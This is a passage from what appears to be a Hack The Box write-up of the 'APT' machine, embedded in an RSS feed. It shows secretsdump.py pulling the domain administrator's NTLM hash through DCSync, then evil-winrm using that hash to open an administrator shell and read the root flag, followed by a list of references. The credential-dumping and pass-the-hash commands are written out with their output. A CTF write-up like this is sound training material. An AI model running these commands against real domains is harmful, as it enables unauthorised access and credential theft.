+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
+$ secretsdump.py <span style="color:#e6db74">&#39;htb.local/APT$@apt&#39;</span> -hashes <span style="color:#e6db74">&#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798&#39;</span> -just-dc-user administrator
+
+Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+...&lt;snip&gt;..
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</code></pre></div><p>I can login into the box using <code>evil-winrm</code> with the administrator hash I obtained.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
+$ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
+a1f204c405aea36388...&lt;SNIP&gt;...
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; 
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li>
+<p><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc</a></p>
+</li>
+<li>
+<p><a href="https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM">https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM</a></p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0</a></p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4</a></p>
+</li>
+<li>
+<p><a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a></p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p>
+</li>
+<li>
+<p><a href="https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf">https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf</a></p>
+</li>
+<li>
+<p><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
+</li>
+<li>
+<p><a href="https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/">https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/</a></p>
+</li>
+<li>
+<p><a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026">https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026</a></p>
+</li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
